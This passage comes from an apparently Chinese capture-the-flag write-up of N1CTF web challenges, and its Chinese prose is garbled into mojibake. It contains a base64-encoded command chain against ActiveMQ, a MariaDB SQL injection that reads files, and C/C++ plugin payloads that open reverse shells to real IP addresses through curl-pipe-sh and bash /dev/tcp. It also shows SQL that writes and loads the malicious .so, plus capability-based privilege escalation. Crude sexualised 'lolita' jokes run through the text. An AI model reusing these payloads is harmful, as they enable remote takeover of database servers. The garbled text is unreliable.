QURrQUFRQk5BQUFBQkFBQkFDOEFBUUJWQUZZQUFRQTFBQUFBalFBREFBTUFBQUFxc2dBZHV3QW9XYmNBS1JJcXRnQXJLOEFBTExrQUxRRUF0Z0FydGdBdXRnQWZwd0FJVFN5MkFEQ3hBQUVBQUFBaEFDUUFMd0FEQURZQUFBQVdBQVVBQUFBdEFDRUFNQUFrQUM0QUpRQXZBQ2tBTVFBM0FBQUFJQUFEQUNVQUJBQlhBRmdBQWdBQUFDb0FPQUE1QUFBQUFBQXFBRWtBV1FBQkFGb0FBQUFIQUFKa0J3QXZCQUFCQUZzQUFBQUNBRnc9fGJhc2U2NCAtZCA+L3RtcC9tbGdiLnR4dCIsImVjaG8geXY2NnZnQUFBRFFBd1FvQU1RQmRCd0JlQ0FCZkNnQUNBR0FMQUdFQVlnY0FZd3NBWkFCbENBQm1Dd0FHQUdjTEFBWUFhQWNBYVFnQWFnZ0Fhd2dBYkFjQWJRY0FiZ29BRUFCdkNnQVFBSEFLQUhFQWNnb0FEd0J6Q0FCMENnQVBBSFVLQUE4QWRnb0FDd0IzQ2dBTEFIZ0xBQVlBZVFzQUxBQjZDd0I3QUh3SkFIMEFmZ2dBZndvQWdBQ0JDd0JrQUlJSUFJTUxBQVlBaEFzQWhRQ0dDd0JrQUljSEFJZ0tBQ1VBWFFvQUpRQ0pCd0NLQ2dBb0FGMElBSXNLQUNnQWpBY0FqUXNBTEFDT0NnQW9BSThIQUpBS0FDOEFrUWNBa2djQWt3RUFCanhwYm1sMFBnRUFBeWdwVmdFQUJFTnZaR1VCQUE5TWFXNWxUblZ0WW1WeVZHRmliR1VCQUJKTWIyTmhiRlpoY21saFlteGxWR0ZpYkdVQkFBUjBhR2x6QVFBR1RFMWhhVzQ3QVFBSGNIVmliR2x6YUFFQUIyWmhZM1J2Y25rQkFCMU1hbUYyWVhndmFtMXpMME52Ym01bFkzUnBiMjVHWVdOMGIzSjVPd0VBQ21OdmJtNWxZM1JwYjI0QkFCWk1hbUYyWVhndmFtMXpMME52Ym01bFkzUnBiMjQ3QVFBS2NIVmlVMlZ6YzJsdmJnRUFFMHhxWVhaaGVDOXFiWE12VTJWemMybHZianNCQUFWeGRXVjFaUUVBRVV4cVlYWmhlQzlxYlhNdlVYVmxkV1U3QVFBSmNIVmliR2x6YUdWeUFRQWJUR3BoZG1GNEwycHRjeTlOWlhOellXZGxVSEp2WkhWalpYSTdBUUFEWTIxa0FRQVRXMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBQW1KekFRQUNXMElCQUFkdFpYTnpZV2RsQVFBU1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQURiWE5uQVFBWFRHcGhkbUY0TDJwdGN5OVVaWGgwVFdWemMyRm5aVHNCQUFwRmVHTmxjSFJwYjI1ekFRQUhZMjl1YzNWdFpRRUFDbk4xWWxObGMzTnBiMjRCQUFwemRXSnpZM0pwWW1WeUFRQWJUR3BoZG1GNEwycHRjeTlOWlhOellXZGxRMjl1YzNWdFpYSTdBUUFFYldGcGJnRUFGaWhiVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFBUmhjbWR6QVFBSmIyNU5aWE56WVdkbEFRQVdLRXhxWVhaaGVDOXFiWE12VFdWemMyRm5aVHNwVmdFQUFXVUJBQlZNYW1GMllTOXNZVzVuTDBWNFkyVndkR2x2YmpzQkFCTk1hbUYyWVhndmFtMXpMMDFsYzNOaFoyVTdBUUFOVTNSaFkydE5ZWEJVWVdKc1pRRUFDbE52ZFhKalpVWnBiR1VCQUFsTllXbHVMbXBoZG1FTUFETUFOQUVBTFc5eVp5OWhjR0ZqYUdVdllXTjBhWFpsYlhFdlFXTjBhWFpsVFZGRGIyNXVaV04wYVc5dVJtRmpkRzl5ZVFFQUZYUmpjRG92THpFeU55NHdMakF1TVRvMk1UWXhOZ3dBTXdDVUJ3Q1ZEQUNXQUpjQkFCRnFZWFpoZUM5cWJYTXZVMlZ6YzJsdmJnY0FtQXdBbVFDYUFRQUpabXhoWjNGMVpYVmxEQUNiQUp3TUFKMEFuZ0VBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNCQUFjdlltbHVMM05vQVFBQ0xXTUJBQWxqWVhRZ0wyWnNZV2NCQUJGcVlYWmhMM1YwYVd3dlUyTmhibTVsY2dFQUdHcGhkbUV2YkdGdVp5OVFjbTlqWlhOelFuVnBiR1JsY2d3QU13QlREQUNmQUtBSEFLRU1BS0lBb3d3QU13Q2tBUUFDWEVFTUFLVUFwZ3dBcHdDb0RBQ3BBS29NQURNQXF3d0FyQUN0REFDdUFKUUhBSzhNQUxBQVZnY0FzUXdBc2dDekFRQVFjSFZpYkdsemFDQm1hVzVwYzJobFpBY0F0QXdBdFFDVURBQzJBRFFCQUE5MFkzQTZMeTk0ZUhnNk5qRTJNVFlNQUxjQXVBY0F1UXdBdWdDN0RBQ2ZBRFFCQUFSTllXbHVEQUE2QURRQkFCZHFZWFpoTDJ4aGJtY3ZVM1J5YVc1blFuVnBiR1JsY2dFQUNWSmxZMlZwZG1Wa0lBd0F2QUM5QVFBVmFtRjJZWGd2YW0xekwxUmxlSFJOWlhOellXZGxEQUMrQUtnTUFMOEFxQUVBRTJwaGRtRXZiR0Z1Wnk5RmVHTmxjSFJwYjI0TUFNQUFOQUVBRUdwaGRtRXZiR0Z1Wnk5UFltcGxZM1FCQUJscVlYWmhlQzlxYlhNdlRXVnpjMkZuWlV4cGMzUmxibVZ5QVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bFdBUUFiYW1GMllYZ3ZhbTF6TDBOdmJtNWxZM1JwYjI1R1lXTjBiM0o1QVFBUVkzSmxZWFJsUTI5dWJtVmpkR2x2YmdFQUdDZ3BUR3BoZG1GNEwycHRjeTlEYjI1dVpXTjBhVzl1T3dFQUZHcGhkbUY0TDJwdGN5OURiMjV1WldOMGFXOXVBUUFOWTNKbFlYUmxVMlZ6YzJsdmJnRUFGeWhhU1NsTWFtRjJZWGd2YW0xekwxTmxjM05wYjI0N0FRQUxZM0psWVhSbFVYVmxkV1VCQUNVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoZUM5cWJYTXZVWFZsZFdVN0FRQU9ZM0psWVhSbFVISnZaSFZqWlhJQkFEUW9UR3BoZG1GNEwycHRjeTlFWlhOMGFXNWhkR2x2YmpzcFRHcGhkbUY0TDJwdGN5OU5aWE56WVdkbFVISnZaSFZqWlhJN0FRQUZjM1JoY25RQkFCVW9LVXhxWVhaaEwyeGhibWN2VUhKdlkyVnpjenNCQUJGcVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3dFQURtZGxkRWx1Y0hWMFUzUnlaV0Z0QVFBWEtDbE1hbUYyWVM5cGJ5OUpibkIxZEZOMGNtVmhiVHNCQUJnb1RHcGhkbUV2YVc4dlNXNXdkWFJUZEhKbFlXMDdLVllCQUF4MWMyVkVaV3hwYldsMFpYSUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMM1YwYVd3dlUyTmhibTVsY2pzQkFBUnVaWGgwQVFBVUtDbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQWhuWlhSQ2VYUmxjd0VBQkNncFcwSUJBQVVvVzBJcFZnRUFFV055WldGMFpWUmxlSFJOWlhOellXZGxBUUFaS0NsTWFtRjJZWGd2YW0xekwxUmxlSFJOWlhOellXZGxPd0VBQjNObGRGUmxlSFFCQUJscVlYWmhlQzlxYlhNdlRXVnpjMkZuWlZCeWIyUjFZMlZ5QVFBRWMyVnVaQUVBRUdwaGRtRXZiR0Z1Wnk5VGVYTjBaVzBCQUFOdmRYUUJBQlZNYW1GMllTOXBieTlRY21sdWRGTjBjbVZoYlRzQkFCTnFZWFpoTDJsdkwxQnlhVzUwVTNSeVpXRnRBUUFIY0hKcGJuUnNiZ0VBQldOc2IzTmxBUUFPWTNKbFlYUmxRMjl1YzNWdFpYSUJBRFFvVEdwaGRtRjRMMnB0Y3k5RVpYTjBhVzVoZEdsdmJqc3BUR3BoZG1GNEwycHRjeTlOWlhOellXZGxRMjl1YzNWdFpYSTdBUUFaYW1GMllYZ3ZhbTF6TDAxbGMzTmhaMlZEYjI1emRXMWxjZ0VBRW5ObGRFMWxjM05oWjJWTWFYTjBaVzVsY2dFQUhpaE1hbUYyWVhndmFtMXpMMDFsYzNOaFoyVk1hWE4wWlc1bGNqc3BWZ0VBQm1Gd2NHVnVaQUVBTFNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1kQ2RXbHNaR1Z5T3dFQUIyZGxkRlJsZUhRQkFBaDBiMU4wY21sdVp3RUFEM0J5YVc1MFUzUmhZMnRVY21GalpRQWhBQ1VBTVFBQkFESUFBQUFGQUFFQU13QTBBQUVBTlFBQUFDOEFBUUFCQUFBQUJTcTNBQUd4QUFBQUFnQTJBQUFBQmdBQkFBQUFCUUEzQUFBQURBQUJBQUFBQlFBNEFEa0FBQUFDQURvQU5BQUNBRFVBQUFGZUFBVUFDZ0FBQUpxN0FBSlpFZ08zQUFSTUs3a0FCUUVBVFN3REJMa0FCd01BVGkwU0NMa0FDUUlBT2dRdEdRUzVBQW9DQURvRkJyMEFDMWtERWd4VFdRUVNEVk5aQlJJT1V6b0d1d0FQV2JzQUVGa1pCcmNBRWJZQUVyWUFFN2NBRkJJVnRnQVd0Z0FYdGdBWU9nZTdBQXRaR1FlM0FCazZDQzI1QUJvQkFEb0pHUWtaQ0xrQUd3SUFHUVVaQ2JrQUhBSUFzZ0FkRWg2MkFCOHN1UUFnQVFDeEFBQUFBZ0EyQUFBQVJnQVJBQUFBQ0FBS0FBa0FFUUFLQUJvQUN3QWtBQXdBTGdBTkFFTUFEZ0JiQUE4QVhnQVFBR0VBRVFCbUFCSUFjUUFUQUhrQUZBQ0NBQlVBaXdBV0FKTUFGd0NaQUJnQU53QUFBR1lBQ2dBQUFKb0FPQUE1QUFBQUNnQ1FBRHNBUEFBQkFCRUFpUUE5QUQ0QUFnQWFBSUFBUHdCQUFBTUFKQUIyQUVFQVFnQUVBQzRBYkFCREFFUUFCUUJEQUZjQVJRQkdBQVlBWmdBMEFFY0FTQUFIQUhFQUtRQkpBRW9BQ0FCNUFDRUFTd0JNQUFrQVRRQUFBQVFBQVFBdkFBSUFUZ0EwQUFJQU5RQUFBTFVBQXdBR0FBQUFQYnNBQWxrU0liY0FCRXdydVFBRkFRQk5MQU1FdVFBSEF3Qk9MUklJdVFBSkFnQTZCQzBaQkxrQUlnSUFPZ1VaQlNxNUFDTUNBQ3k1QUNRQkFMRUFBQUFDQURZQUFBQWlBQWdBQUFBYkFBb0FIQUFSQUIwQUdnQWVBQ1FBSHdBdUFDQUFOZ0FoQUR3QUlnQTNBQUFBUGdBR0FBQUFQUUE0QURrQUFBQUtBRE1BT3dBOEFBRUFFUUFzQUQwQVBnQUNBQm9BSXdCUEFFQUFBd0FrQUJrQVFRQkNBQVFBTGdBUEFGQUFVUUFGQUUwQUFBQUVBQUVBTHdBSkFGSUFVd0FDQURVQUFBQkpBQUlBQWdBQUFBMjdBQ1ZadHdBbVRDdTNBQ2V4QUFBQUFnQTJBQUFBRGdBREFBQUFKZ0FJQUNjQURBQW9BRGNBQUFBV0FBSUFBQUFOQUZRQVJnQUFBQWdBQlFCU0FEa0FBUUJOQUFBQUJBQUJBQzhBQVFCVkFGWUFBUUExQUFBQWpRQURBQU1BQUFBcXNnQWR1d0FvV2JjQUtSSXF0Z0FySzhBQUxMa0FMUUVBdGdBcnRnQXV0Z0FmcHdBSVRTeTJBREN4QUFFQUFBQWhBQ1FBTHdBREFEWUFBQUFXQUFVQUFBQXRBQ0VBTUFBa0FDNEFKUUF2QUNrQU1RQTNBQUFBSUFBREFDVUFCQUJYQUZnQUFnQUFBQ29BT0FBNUFBQUFBQUFxQUVrQVdRQUJBRm9BQUFBSEFBSmtCd0F2QkFBQkFGc0FBQUFDQUZ3PXxiYXNlNjQgLWQgPi90bXAvbWxnYi50eHQiXX0= ç„¶å base64 ç¼–ç ï¼Œæ”¾å…¥ oneway çš„è·¯å¾„ğŸ¤ª ç»è°ƒè¯•ï¼Œç”±äºä¸€æ¬¡æ€§ä¸èƒ½å†™é‚£ä¹ˆé•¿çš„å†…å®¹ï¼Œåªèƒ½æ›²çº¿æ•‘å›½ åˆ†æ®µå†™å…¥ 1 å’Œ 2, ç„¶ååˆå¹¶å†™å…¥ 3, å† base64 è§£ç  (è¿™ nm æ˜¯äººèƒ½æå‡ºæ¥çš„æ“ä½œï¼Ÿæœ¬æ¥å°±æ¶å¿ƒï¼Œè¿˜ç»™ğŸ‘´ä½¿ç»Šï¼Œå·®ä¸å¤šå¾—äº†ğŸ˜…ğŸ˜“) 1&#123;&quot;lpcAllCom&quot;:[&quot;cat /tmp/1 /tmp/2|tr -d &#x27;\\n&#x27;|tee /tmp/3&quot;,&quot;cat /tmp/1 /tmp/2|tr -d &#x27;\\n&#x27;|tee /tmp/3&quot;]&#125; 1&#123;&quot;lpcAllCom&quot;:[&quot;base64 -d -i /tmp/sss |tee /tmp/Main.class&quot;,&quot;base64 -d -i /tmp/sss |tee /tmp/Main.class&quot;]&#125; 1eyJscGNBbGxDb20iOlsiYmFzZTY0IC1kIC1pIC90bXAvc3NzIHx0ZWUgL3RtcC9NYWluLmNsYXNzIiwiYmFzZTY0IC1kIC1pIC90bXAvc3NzIHx0ZWUgL3RtcC9NYWluLmNsYXNzIl19 è§£ç ï¼Œå†™å‡º Main.class java è¿è¡ŒğŸ¤” 1java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main 1&#123;&quot;lpcAllCom&quot;:[&quot;java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main&quot;,&quot;java -cp /opt/apache-activemq/lib/optional/*:/tmp:/opt/apache-activemq/activemq-all-5.17.5.jar Main&quot;]&#125; wcsndm, æœ¬åœ°ç¯å¢ƒ base64tmd å†™ä¸äº†æ–‡ä»¶ğŸ˜…,âˆšâ…§ssrf å‘½ä»¤æ‰§è¡Œä¹Ÿå°½æ¶å¿ƒäººï¼Œé¢˜ç›®è¿˜ä¸ç»™ç¼–è¯‘ï¼Œä½  tmjava ä¸ç”¨ç¼–è¯‘æ˜¯å§ğŸ˜“ğŸ˜…, æ‰‹ æ“ class æ–‡ä»¶æ˜¯å§. å“¦ï¼Œæºèµ–æ° java11 ç¼–è¯‘å’Œè¿è¡Œä¸€ä½“åŒ–ï¼Œä¸€ä¸ª java å°±èƒ½æå®šï¼Œnmsl (é‚£æ²¡äº‹äº†)ğŸ˜Š ä¹‹åè°ƒç”¨ comsume å‡½æ•°å°±è¡Œï¼Œç”±äº flag å·²ç»å†™å…¥é˜Ÿåˆ—äº†ï¼Œè¯»é˜Ÿåˆ—å°±è¡Œäº†.ğŸ¤£ 12345678910111213public static void main(String[] args) throws Exception &#123; Main main = new Main(); main.consume(); &#125;private void consume() throws Exception &#123; ConnectionFactory factory = new ActiveMQConnectionFactory(&quot;tcp://target:61616&quot;); Connection connection = factory.createConnection(); Session subSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Queue queue = subSession.createQueue(&quot;flagqueue&quot;); MessageConsumer subscriber = subSession.createConsumer(queue); subscriber.setMessageListener(this); connection.start(); &#125; MessageConsumer subscriber = subSession.createConsumer(queue); ï¼šä½¿ç”¨ Session åˆ›å»ºä¸€ä¸ª MessageConsumer å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç”¨äºæ¥æ”¶é˜Ÿåˆ— flagqueue ä¸Šçš„æ¶ˆæ¯ã€‚ ä¸€ä¸ªå¾·æ‹‰ç±³ï¼Œä½ è®¾è®¡ç‰›é­”çš„âˆšâ…§ é¢˜å‘¢ï¼Œçº¯ğŸ˜…æ¶å¿ƒäººï¼Œå¤ç°éƒ½ä¸è®©äº†ğŸ‘´å®‰å®ã€‚è¿˜å¥½ğŸ‘´æ˜¯å®Œç¾å¤©æ‰çš„ idol (æš´è®ºğŸ˜¡) æ³¨æ„ç±³çº¿ ez_maria å¥½å¯çˆ±çš„ lolitağŸ¥µğŸ¥µ, ä¸çŸ¥é“ n1 éƒ½æ€ä¹ˆå¿ä½çš„ï¼Œæ˜¯æˆ‘ç›´æ¥â€¦ ç‹ ç‹ åœ°æŠŠè¿™é¢˜åšå‡ºæ¥ï¼Œè™½ç„¶ä¹Ÿä¸ä¸€å®šèƒ½åšå‡ºæ¥å°±æ˜¯äº†.ğŸ˜¤ ä¸Šæ¥å°±å‘Šè¯‰ä½ æœ‰ SQL çš„åˆ©ç”¨ç‚¹ï¼Œä¸å¤šè¯´ï¼Œç›´æ¥ç‹ ç‹ åœ°æç‚¹äº‹. äºŒè¯ä¸è¯´ï¼Œæ‰“ä¸ªç»çº¿ (è¯»ä¸ª index.php) 1id=0 union select 1, load_file(&#x27;/var/www/html/index.php&#x27;) æºç åˆ†æ 123456789101112131415161718192021&lt;?php//for n1ctf ezmariadb secret cmdif ($_REQUEST[&quot;secret&quot;] === &quot;lolita_love_you_forever&quot;)&#123; header(&quot;Content-Type: text/plain&quot;); echo &quot;\\\\n\\\\n`ps -ef` result\\\\n\\\\n&quot;; system(&quot;ps -ef&quot;); echo &quot;\\\\n\\\\n`ls -l /` result\\\\n\\\\n&quot;; system(&quot;ls -l /&quot;); echo &quot;\\\\n\\\\n`ls -l /var/www/html/` result\\\\n\\\\n&quot;; system(&quot;ls -l /var/www/html/&quot;); echo &quot;\\\\n\\\\n`find /mysql` result\\\\n\\\\n&quot;; system(&quot;find /mysql&quot;); die(&quot;can you get shell?&quot;);&#125;$servername = &quot;127.0.0.1&quot;;$username = &quot;root&quot;;$password = &quot;123456&quot;;$dbn = &quot;ctf&quot;; waf 123if (preg_match(&quot;/(master|change|outfile|slave|start|status|insert|delete|drop|execute|function|return|alter|global|immediate)/is&quot;, $_REQUEST[&quot;id&quot;]))&#123; die(&quot;ä½ å°±ä¸èƒ½ç»•ä¸€ä¸‹å–µ&quot;);&#125; å¯ä»¥çœ‹åˆ°å½“ secret=lolita_love_you_forever æ—¶ï¼Œä¼šçˆ†å‡ºä¸€äº›ä¿¡æ¯. lolita çœŸçš„ä¼šçˆ±æˆ‘å—ï¼Œæˆ‘å·²ç»å•èº«äºŒåå¹´ç”šè‡³åä¹å¹´ï¼Œlolita çˆ±æˆ‘çš„è¯ï¼Œå°ğŸš¹ğŸ‘©â€ğŸ¦°ä¹Ÿä¸æ˜¯ä¸è¡Œâ€¦(ä¸è¡Œï¼ŒğŸ‘´æ°¸è¿œå–œæ¬¢æ —å±±æœªæ¥) ä¼ å‚ï¼Œè·å–ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ 1mariadbd --skip-grant-tables --secure-file-priv= --datadir=/mysql/data --plugin_dir=/mysql/plugin --user=mysql plugin ç›®å½•æ˜¯ /mysql/plugin , secure-file-priv æ˜¯ç©ºçš„ï¼Œè¿™è¡¨ç¤º MySQL å…è®¸ä»ä»»ä½•ä½ç½®è¯»å–æ•°æ®æ–‡ä»¶ã€‚ ãªã‚‰ã°ã€ç­”ãˆã¯ã²ã¨ã¤ã .(bushi) å¾€ /mysql/plugin ç›®å½•å†™ so æ‰“ udfğŸ˜Š, è™½ç„¶ function è¢« ban, ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰ INSTALL UDF å†™ soğŸ¤ª å†™æ³•ä¸€: 1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;__attribute__((constructor)) void init(int argc, char *argv[]) &#123; system(&quot;curl https://reverse-shell.sh/82.156.5.200:1034 | sh &amp;&quot;);&#125; å†™æ³•äºŒï¼šæ¥è‡ª Lolita çš„â¤ 1234567891011121314151617#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;void lshell()&#123; system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.143.192.19/1145 0&gt;&amp;1 &amp;&#x27;&quot;);&#125;class LOLITA &#123;public: LOLITA()&#123; lshell(); &#125;&#125;;LOLITA lolita;LOLITA* _mysql_plugin_interface_version_ = &amp;lolita;//compile: g++ expso.cpp -shared -fPIC -o exp.so ä»¥åŠæ¥è‡ª DJB çš„ 12345678// gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init()&#123; system(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/43.143.192.19/1145 0&gt;&amp;1&#x27;&quot;);&#125; 1gcc -fPIC -shared -o preload.so preload.c -nostartfiles -nolibc -nostartfiles -nolibc è¿™ä¸¤ä¸ªé€‰é¡¹æ¯”è¾ƒé«˜çº§ï¼ŒåµŒå…¥å¼ç³»ç»Ÿå¸¸ä½¿ç”¨ å†™å…¥ 123456f = open(&quot;preaload.so&quot;, &#x27;rb&#x27;)xid = &quot;1; select unhex(&#x27;&quot; + &#x27;&#x27;.join([&#x27;%02X&#x27; % b for b in bytes(f.read())]) + &quot;&#x27;) into dumpfile &#x27;/mysql/plugin/lolita.so&#x27;;&quot;res = requests.post(url, data=&#123; &quot;id&quot;: xid&#125;)print(res.text) æˆ–è€… NESE å¤§çˆ¹çš„å†™æ³• 11; select from_base64(&#x27;xx&#x27;) into dumpfile &#x27;/mysql/plugin/xxx.so&#x27;; % ï¼šè¡¨ç¤ºæ ¼å¼è¯´æ˜ç¬¦çš„èµ·å§‹ã€‚ 0 ï¼šè¡¨ç¤ºä½¿ç”¨é›¶æ¥å¡«å……å­—æ®µå®½åº¦ï¼Œå¦‚æœè½¬æ¢çš„å€¼ä¸è¶³æŒ‡å®šçš„å®½åº¦ã€‚ 2 ï¼šè¡¨ç¤ºå­—æ®µçš„æœ€å°å®½åº¦ï¼Œå³è¾“å‡ºçš„å­—ç¬¦ä¸²ä¸­è‡³å°‘ä¼šæœ‰ä¸¤ä¸ªå­—ç¬¦ã€‚ X ï¼šè¡¨ç¤ºè¦å°†æ•´æ•°ä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºï¼Œå¹¶ä¸”ä½¿ç”¨å¤§å†™å­—æ¯ã€‚ å†™è¿›å»è¿˜æ²¡å®Œï¼Œç”±äºæ²¡æœ‰ mysql åº“ï¼Œå¾—å…ˆåˆ›é€ ä¸ª mysql åº“ï¼ŒğŸ‘´çœŸæ˜¯å¤ªèœäº†ï¼ŒğŸ‘´è¦å­¦ï¼ï¼ï¼ 123CREATE DATABASE IF NOT EXISTS mysql;use mysql;CREATE TABLE IF NOT EXISTS plugin ( name varchar(64) DEFAULT &#x27;&#x27; NOT NULL, dl varchar(128) DEFAULT &#x27;&#x27; NOT NULL, PRIMARY KEY (name) ) engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci comment=&#x27;MySQL plugins&#x27;; 121;create database mysql;create table mysql.plugin(name varchar(64), dl varchar(128));INSTALL PLUGIN testx SONAME &#x27;lolita.so&#x27;; CREATE TABLE IF NOT EXISTS plugin : è¿™éƒ¨åˆ†å¼€å§‹äº†ä¸€ä¸ªåˆ›å»ºè¡¨çš„ SQL è¯­å¥ã€‚ IF NOT EXISTS éƒ¨åˆ†è¡¨ç¤ºå¦‚æœåŒåçš„è¡¨å·²ç»å­˜åœ¨ï¼Œå°±ä¸å†åˆ›å»ºï¼Œä»¥é¿å…é‡å¤åˆ›å»ºã€‚ ( name varchar(64) DEFAULT '' NOT NULL, dl varchar(128) DEFAULT '' NOT NULL) : è¿™ä¸€éƒ¨åˆ†å®šä¹‰äº†è¡¨çš„åˆ—ã€‚å…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š name varchar(64) : åˆ›å»ºä¸€ä¸ªåä¸º â€œnameâ€ çš„åˆ—ï¼Œå…¶æ•°æ®ç±»å‹ä¸º VARCHARï¼Œæœ€å¤§é•¿åº¦ä¸º 64 ä¸ªå­—ç¬¦ã€‚è¿™ä¸ªåˆ—å­˜å‚¨æ’ä»¶çš„åç§°ã€‚ dl varchar(128) : åˆ›å»ºä¸€ä¸ªåä¸º â€œdlâ€ çš„åˆ—ï¼Œå…¶æ•°æ®ç±»å‹ä¸º VARCHARï¼Œæœ€å¤§é•¿åº¦ä¸º 128 ä¸ªå­—ç¬¦ã€‚è¿™ä¸ªåˆ—å­˜å‚¨æ’ä»¶çš„ä¸‹è½½é“¾æ¥ã€‚ DEFAULT '' : è¿™éƒ¨åˆ†æŒ‡å®šäº†å¦‚æœæ²¡æœ‰æä¾›å€¼ï¼Œè¿™ä¸¤ä¸ªåˆ—çš„é»˜è®¤å€¼æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚ NOT NULL : è¿™éƒ¨åˆ†æŒ‡å®šäº†è¿™ä¸¤åˆ—æ˜¯éç©ºçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ’å…¥æ•°æ®æ—¶å¿…é¡»ä¸ºå®ƒä»¬æä¾›å€¼ã€‚ PRIMARY KEY (name) : è¿™ä¸€éƒ¨åˆ†å®šä¹‰äº†ä¸€ä¸ªä¸»é”®çº¦æŸã€‚å®ƒæŒ‡å®š â€œnameâ€ åˆ—ä½œä¸ºä¸»é”®ï¼Œè¿™æ„å‘³ç€ â€œnameâ€ åˆ—ä¸­çš„å€¼å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†æ¯ä¸ªæ’ä»¶ã€‚ engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci : è¿™éƒ¨åˆ†å®šä¹‰äº†è¡¨çš„å¼•æ“ã€äº‹åŠ¡æ€§ã€å­—ç¬¦é›†å’Œæ’åºè§„åˆ™ã€‚ engine=Aria : è¡¨ä½¿ç”¨ Aria å­˜å‚¨å¼•æ“ã€‚ transactional=1 : è¡¨è¢«æŒ‡å®šä¸ºäº‹åŠ¡æ€§è¡¨ã€‚ CHARACTER SET utf8mb3 : è¡¨çš„å­—ç¬¦é›†è¢«è®¾ç½®ä¸º UTF-8 MB3ã€‚ COLLATE utf8mb3_general_ci : è¡¨çš„æ’åºè§„åˆ™è¢«è®¾ç½®ä¸º UTF-8 MB3 çš„é€šç”¨ä¸åŒºåˆ†å¤§å°å†™æ’åºè§„åˆ™ã€‚ comment='MySQL plugins' : è¿™ä¸€éƒ¨åˆ†å¯ä»¥ç”¨äºæä¾›è¡¨çš„æ³¨é‡Šæˆ–æè¿°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¡¨çš„æ³¨é‡Šæ˜¯ â€œMySQL pluginsâ€ï¼Œä»¥ä¾¿æ›´å¥½åœ°ç†è§£è¡¨çš„ç”¨é€”ã€‚ ğŸ‘´ç»™ä½ è¯¦ç»†åœ°ä»‹ç»ä¸€ä¸‹æ€ä¹ˆä¸ªäº‹ï¼Œç®—æ˜¯ä»‹ç»ä¸€ä¸ªå»ºè¡¨æ¨¡æ¿äº†ï¼Œé¿å…ä»¥åå»ºè¡¨å‡º bug. æ¥ä¸‹æ¥åŠ è½½æ¶æ„ so æ–‡ä»¶ï¼Œå¼¹ shell æˆåŠŸ 11;INSTALL PLUGIN lolita SONAME &#x27;lolita.so&#x27;; ç„¶è€Œè¿™å¯å¹¶ä¸æ˜¯ç»ˆç‚¹ï¼Œé˜¿ç±³è¯ºæ–¯ï¼Œflag æ²¡æƒé™è¯» 1find / -exec getcap &#123;&#125; ; 2&gt;/dev/null å¯¹æ¯ä¸ªæ–‡ä»¶è¿è¡Œ getcap å‘½ä»¤ï¼Œä»¥æŸ¥çœ‹æ–‡ä»¶æ˜¯å¦æ‹¥æœ‰ &quot;capabilities&quot; å±æ€§ã€‚è€Œ -exec éƒ¨åˆ†æ˜¯ç”¨äºæ‰§è¡Œè¿™ä¸ªæ£€æŸ¥çš„å‘½ä»¤ï¼Œ &#123;&#125; æ˜¯å ä½ç¬¦ getcap æ˜¯ Linux å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºæ£€æŸ¥å’Œæ˜¾ç¤ºæ–‡ä»¶çš„ &quot;capabilities&quot;ã€‚å®ƒå…è®¸ä½ æŸ¥çœ‹ä¸ç‰¹å®šæ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶ç›¸å…³è”çš„ &quot;capabilities&quot; ç‰›é­”çš„ä»€ä¹ˆäº‹ capabilities æƒé™ğŸ˜“ linux setcap å‘½ä»¤è¯¦è§£ (åŒ…æ‹¬å„ä¸ª cap çš„ä½¿ç”¨ä¸¾ä¾‹)_xiedy001 çš„åšå®¢ - CSDN åšå®¢ Linux ææƒä¹‹ Capabilities ææƒï¼ˆä¸€ï¼‰ - FreeBuf ç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· æ¥è‡ª lolita å°æ”¹æ”¹ (bushi) çš„â¤ &quot;capabilities&quot; æƒé™æ˜¯ Linux å†…æ ¸å¼•å…¥çš„ï¼Œç”¨äºç²¾ç»†åˆ’åˆ†è¶…çº§ç”¨æˆ·æƒé™çš„é¢†åŸŸ è¯´ç™½äº†ï¼Œroot è¢«åˆ†æƒäº†ï¼Œcapabilities ç»§æ‰¿ä¸€éƒ¨åˆ†. CAP_NET_BIND_SERVICE ï¼šå…è®¸ç»‘å®šå°äº 1024 çš„ç½‘ç»œç«¯å£ã€‚ CAP_SYS_ADMIN 